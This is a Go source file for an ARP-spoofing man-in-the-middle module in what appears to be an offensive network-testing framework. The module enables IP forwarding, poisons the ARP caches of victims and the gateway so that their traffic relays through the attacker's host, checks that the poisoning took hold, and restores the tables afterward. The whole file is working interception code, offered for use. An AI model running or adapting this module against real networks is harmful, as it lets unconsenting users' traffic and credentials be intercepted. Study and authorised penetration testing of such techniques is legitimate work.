// Package mitm contains the L2/L3 man-in-the-middle modules: ARP spoofing,
// DNS/DHCP/NDP spoofing, ICMP redirects and WPAD poisoning.
package mitm

import (
	"fmt"
	"net"
	"time"

	"github.com/qyvora/toha3ee/internal/attacks"
	"github.com/qyvora/toha3ee/internal/events"
	"github.com/qyvora/toha3ee/internal/netx/arp"
	"github.com/qyvora/toha3ee/internal/safety"
	"github.com/qyvora/toha3ee/internal/store"
)

// init registers the ARPSpoof module in the global attack registry so it can
// be instantiated by its "arp.spoof" identifier from the REPL/API.
func init() {
	attacks.Register(&ARPSpoof{})
}

// ARPSpoof is the flagship full-duplex ARP man-in-the-middle module.
type ARPSpoof struct{}

// Meta implements attacks.Module, returning the module's registry descriptor.
func (*ARPSpoof) Meta() attacks.ModuleMeta {
	return attacks.ModuleMeta{
		ID:       "arp.spoof",
		Category: "mitm",
		Risk:     attacks.RiskMedium,
		Targets:  []string{"gateway", "host"},
		// Raw sockets are needed to inject spoofed ARP replies at L2, and
		// ip_forward must be on so traffic relayed through this host keeps
		// flowing to/from the internet.
		Requires:    []string{"cap.raw_socket", "cap.ip_forward"},
		Description: "full-duplex ARP spoofing between the gateway and victim hosts (traffic relays through this host)",
		Limitations: "networks with ARP spoofing protection (switches with ARP/DHCP snooping) overwrite poisoned entries; verify before relying on captured data",
	}
}

// arpRunState carries the live objects an attack session needs to manage,
// verify and tear down an ARP poisoning run.
type arpRunState struct {
	spoof   *arp.Spoofer      // active background poisoning loop
	hb      *safety.Heartbeat // watchdog that proves the loop is still alive
	restore func() error      // reserved ip_forward restore callback
	pairs   []arp.Pair        // the poison relationships currently in effect
	arpSnap []arp.Row         // kernel ARP table snapshot taken before poisoning
}

// Preflight checks root, interface, gateway/targets and enables ip_forward.
func (*ARPSpoof) Preflight(ctx *attacks.AttackCtx) (*attacks.PreflightReport, error) {
	rep := &attacks.PreflightReport{}

	// Root is mandatory: injecting spoofed ARP frames requires a raw L2 socket.
	if err := safety.RequireRoot(); err != nil {
		rep.AddBlocked("root", err.Error())
	} else {
		rep.AddOK("root", "raw packet injection available")
	}

	// Without an interface there is nothing to bind the injection socket to,
	// so the remaining checks are pointless.
	if ctx.Iface == nil {
		rep.AddBlocked("iface", "no interface configured")
		return rep, nil
	}
	rep.AddOK("iface", ctx.Iface.String())

	// The gateway is the "other side" of the full-duplex poison; if it cannot
	// be resolved the run can still target hosts, but traffic can no longer be
	// relayed to/from the internet.
	gw, err := ctx.Iface.Gateway()
	if err != nil {
		rep.AddFixable("gateway", fmt.Sprintf("no default gateway: %v", err))
	} else {
		rep.AddOK("gateway", gw.String())
	}

	// In internal mode two victims are poisoned against each other, so no
	// kernel forwarding is required; otherwise enable ip_forward so relayed
	// traffic keeps flowing. The returned closure restores the prior kernel
	// setting on shutdown and is stashed in ctx state for cleanup.
	internal := ctx.Conf.GetBool("arp.spoof", "internal", false)
	if !internal {
		if err := safety.RequireRoot(); err == nil {
			restore, err := safety.EnableIPForward()
			if err != nil {
				rep.AddFixable("ip_forward", err.Error())
			} else {
				rep.AddFixed("ip_forward", "kernel forwarding enabled (restored on exit)")
				ctx.SetState("ip_forward_restore", restore)
			}
		}
	}

	// Validate that the configured target list resolves before committing to a
	// run; the !internal flag makes internal mode require at least 2 targets.
	_, targetErr := attacks.TargetsFromConfig(ctx, "arp.spoof", "targets", !internal)
	if targetErr != nil {
		rep.AddBlocked("targets", targetErr.Error())
	} else {
		rep.AddOK("targets", "target list resolved")
	}
	return rep, nil
}

// Run starts the poisoning loop and blocks until ctx.Done is closed.
func (m *ARPSpoof) Run(ctx *attacks.AttackCtx, opts map[string]string) error {
	internal := ctx.Conf.GetBool("arp.spoof", "internal", false)
	gw, _ := ctx.Iface.Gateway()

	pairs, err := m.buildPairs(ctx, gw, internal)
	if err != nil {
		return err
	}
	if len(pairs) == 0 {
		return fmt.Errorf("arp.spoof: no targets resolved; set arp.spoof.targets")
	}

	// refresh is how often the spoof loop re-announces the poisoned mapping so
	// the victims' ARP cache entries do not expire back to the real MACs (the
	// cache typically holds an entry for tens of seconds to minutes).
	refresh := ctx.Conf.GetDuration("arp.spoof", "refresh", 2*time.Second)
	spoof, err := arp.NewSpoofer(ctx.Iface, pairs, refresh)
	if err != nil {
		return fmt.Errorf("arp.spoof: %w", err)
	}
	spoof.Start()

	// Wire up the watchdog heartbeat (so the UI can tell the loop is alive)
	// and the cleanup hook that must fire when the attack stops.
	hb := safety.NewHeartbeat()
	ctx.Heartbeat = hb.Beat
	ctx.Safety.RegisterHeartbeat("arp.spoof", hb)
	ctx.Safety.RegisterCleanup("arp.spoof", "restore ARP tables and ip_forward", m.makeCleanup(ctx))

	// Snapshot the kernel ARP table before poisoning so cleanup can restore
	// the victims' view even if the spoof loop missed a beat.
	snap, _ := arp.SnapshotTable()

	state := &arpRunState{spoof: spoof, hb: hb, pairs: pairs, arpSnap: snap}
	ctx.SetState("arp.spoof", state)

	ctx.Emit(events.TopicARPSpoofStarted, fmt.Sprintf("arp.spoof started: %d pair(s), internal=%v", len(pairs), internal), pairs)
	ctx.Printf("[*] arp.spoof running (fullduplex=%v, %d pairs). Ctrl-C or 'arp.spoof off' to restore.\n",
		!internal, len(pairs))

	// Keep the process alive and the heartbeat beating until the session is
	// cancelled; all real work happens in the Spoofer's background loop.
	for {
		select {
		case <-ctx.Done:
			return nil
		case <-time.After(2 * time.Second):
			hb.Beat()
		}
	}
}

// Verify proves the poison is live by probing each victim's ARP cache: we
// ask the victim who owns the gateway (or spoofed peer) IP and confirm it
// answers with our MAC.
func (m *ARPSpoof) Verify(ctx *attacks.AttackCtx) (*attacks.Impact, error) {
	st, ok := ctx.GetState("arp.spoof")
	if !ok {
		return nil, fmt.Errorf("arp.spoof not running")
	}
	state := st.(*arpRunState)

	poisoned, total := 0, 0
	for _, p := range state.pairs {
		total++
		// Resolve the victim's MAC, then ask that MAC directly: "who is the
		// spoofed IP?" If the reply's sender MAC is ours, the cache is poisoned.
		vmac, _ := attacks.ResolveMAC(ctx, p.TargetIP, 2*time.Second)
		mac, err := arp.Probe(ctx.Iface, vmac, p.SpoofedIP, 3*time.Second)
		if err != nil {
			continue
		}
		if srcEqual(mac, ctx.Iface.MAC) {
			poisoned++
		}
	}

	imp := &attacks.Impact{}
	if poisoned == 0 {
		imp.Summary = fmt.Sprintf("attack likely failed — %d/%d victims confirmed poisoned (ARP protection likely active)", poisoned, total)
	} else {
		imp.Summary = fmt.Sprintf("%d/%d victims confirmed poisoned (their ARP cache points the spoofed IP at this host)", poisoned, total)
	}
	sent, _ := state.spoof.Stats()
	imp.Add("poisoned", fmt.Sprintf("%d", poisoned))
	imp.Add("total", fmt.Sprintf("%d", total))
	imp.Add("packets_sent", fmt.Sprintf("%d", sent))
	return imp, nil
}

// Cleanup stops poisoning and restores ARP tables and ip_forward.
func (m *ARPSpoof) Cleanup(ctx *attacks.AttackCtx) error {
	cleanup := m.makeCleanup(ctx)
	// Unregister the hooks first so a later safety-driven teardown does not run
	// the same restoration twice.
	ctx.Safety.UnregisterCleanup("arp.spoof")
	ctx.Safety.UnregisterHeartbeat("arp.spoof")
	return cleanup()
}

// makeCleanup builds the teardown closure registered for this run: it stops
// the spoof loop, rewrites the victims' ARP entries back to the real MACs and
// undoes the ip_forward change, aggregating any partial failures.
func (m *ARPSpoof) makeCleanup(ctx *attacks.AttackCtx) func() error {
	return func() error {
		var errs []error
		if v, ok := ctx.GetState("arp.spoof"); ok {
			state := v.(*arpRunState)
			// Stop announcing, then actively re-announce the true mappings so
			// the victims' caches recover without waiting for their timeout.
			state.spoof.Stop()
			if err := state.spoof.Restore(); err != nil {
				errs = append(errs, err)
			}
			// Fall back to the pre-attack kernel snapshot if the loop-based
			// restore could not be applied.
			if len(state.arpSnap) > 0 {
				if err := arp.Restore(state.arpSnap); err != nil {
					errs = append(errs, err)
				}
			}
			ctx.Store.LogEvent(events.TopicARPSpoofStopped,
				fmt.Sprintf("arp.spoof stopped; %d pair(s) restored", len(state.pairs)))
		}
		// Undo the ip_forward toggle recorded during preflight.
		if v, ok := ctx.GetState("ip_forward_restore"); ok {
			if fn, ok := v.(func() error); ok {
				if err := fn(); err != nil {
					errs = append(errs, err)
				}
			}
		}
		if len(errs) > 0 {
			return fmt.Errorf("cleanup partial: %v", errs)
		}
		return nil
	}
}

// buildPairs constructs the poison relationships for fullduplex or internal
// modes.
func (m *ARPSpoof) buildPairs(ctx *attacks.AttackCtx, gw net.IP, internal bool) ([]arp.Pair, error) {
	attackerMAC := ctx.Iface.MAC
	if internal {
		// Internal mode: make target A believe B lives at our MAC and vice
		// versa, so traffic between two hosts on the same segment flows
		// through us.
		targets, err := attacks.TargetsFromConfig(ctx, "arp.spoof", "targets", true)
		if err != nil {
			return nil, err
		}
		if len(targets) < 2 {
			return nil, fmt.Errorf("internal mode needs at least 2 targets (use arp.spoof.targets 'IP1 IP2')")
		}
		a, b := targets[0], targets[1]
		return []arp.Pair{
			// A's view: the spoofed peer B now lives at attackerMAC; RealMAC
			// remembers B's true address for restoration.
			{TargetIP: a.IP, TargetMAC: a.MAC, SpoofedIP: b.IP, SpoofedMAC: attackerMAC, RealMAC: b.MAC},
			// B's view: the spoofed peer A now lives at attackerMAC.
			{TargetIP: b.IP, TargetMAC: b.MAC, SpoofedIP: a.IP, SpoofedMAC: attackerMAC, RealMAC: a.MAC},
		}, nil
	}

	// Fullduplex mode: first learn the gateway's real MAC, because that is the
	// value we must restore later and the identity we impersonate.
	gwMAC, err := attacks.ResolveMAC(ctx, gw, 3*time.Second)
	if err != nil {
		return nil, fmt.Errorf("resolve gateway MAC: %w", err)
	}
	targets, err := attacks.TargetsFromConfig(ctx, "arp.spoof", "targets", true)
	if err != nil {
		return nil, err
	}
	if len(targets) == 0 {
		return nil, fmt.Errorf("no targets; run net.scan first or set arp.spoof.targets")
	}

	var pairs []arp.Pair
	for _, t := range targets {
		// Resolve the victim's MAC if the store does not already have it;
		// unresolvable hosts are skipped because we cannot address them.
		vmac := t.MAC
		if vmac == nil {
			vmac, err = attacks.ResolveMAC(ctx, t.IP, 3*time.Second)
			if err != nil {
				continue
			}
		}
		// Victim's view: the gateway now lives at attackerMAC, so the victim's
		// internet-bound frames are delivered to us (and forwarded onward by
		// the kernel).
		pairs = append(pairs, arp.Pair{
			TargetIP: t.IP, TargetMAC: vmac, SpoofedIP: gw, SpoofedMAC: attackerMAC, RealMAC: gwMAC,
		})
		// Full duplex: also poison the gateway's view of the victim, so replies
		// from the internet are sent to us as well instead of straight to the
		// victim (required because most switches forward by destination MAC).
		pairs = append(pairs, arp.Pair{
			TargetIP: gw, TargetMAC: gwMAC, SpoofedIP: t.IP, SpoofedMAC: attackerMAC, RealMAC: vmac,
		})
	}
	return pairs, nil
}

// srcEqual compares two hardware addresses byte for byte; it avoids relying on
// net.HardwareAddr.Equal semantics on possibly mismatched lengths.
func srcEqual(a, b net.HardwareAddr) bool {
	if len(a) != len(b) {
		return false
	}
	for i := range a {
		if a[i] != b[i] {
			return false
		}
	}
	return true
}

// Compile-time assertions: ARPSpoof must implement attacks.Module, and the
// store.Host reference keeps the store import (used for log events) linked in.
var _ attacks.Module = (*ARPSpoof)(nil)
var _ = store.Host{}
